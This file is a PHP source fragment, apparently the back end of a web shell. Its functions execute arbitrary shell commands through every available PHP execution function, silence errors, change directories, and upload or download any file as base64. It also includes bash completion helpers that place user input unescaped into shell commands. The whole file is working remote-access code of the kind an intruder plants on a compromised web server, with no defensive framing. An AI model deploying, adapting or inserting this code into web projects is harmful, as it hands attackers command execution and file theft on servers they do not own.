function is_cmd_blocked() {
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);
    $required = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
    foreach ($required as $func) {
        if (!in_array($func, $disabled) && function_exists($func)) {
            return false;
        }
    }
    return true;
}

$isBlocked = is_cmd_blocked();

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        @exec("echo $match[1]", $stdout);
        return ($stdout[0] ?? $path) . ($match[2] ?? '');
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        @exec($cmd, $outputArr);
        $output = implode("\n", $outputArr);
    } else if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        @system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        @passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = @popen($cmd, 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        }
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = @proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        if (is_resource($handle)) {
            $output = stream_get_contents($pipes[1]);
            proc_close($handle);
        }
    }
    return $output;
}

function featureShell($cmd, $cwd) {
    @chdir($cwd);
    $stdout = "";
    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        @chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        @chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*upload\s+([^\s]+)\s*(2>&1)?$/", $cmd)) {
        return array("stdout" => "Opening file picker...\n", "cwd" => getcwd());
    } elseif (preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd)) {
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        $dl = featureDownload($match[1], $cwd);
        if (isset($dl['error'])) {
            return array("stdout" => $dl['error'], "cwd" => getcwd());
        }
        $dl['stdout'] = "Download starting...\n";
        $dl['cwd'] = getcwd();
        return $dl;
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }
    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", trim(executeCommand($cmd)));
    return array('files' => array_filter($files));
}

function featureDownload($filePath, $cwd) {
    chdir($cwd);
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array('error' => 'File not found / no read permission.');
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    @chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        $dir = getcwd();
        return array('error' => "Cannot write to: $path (Current Dir: $dir)");
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array('output' => "Upload successful to: $path");
    }
}

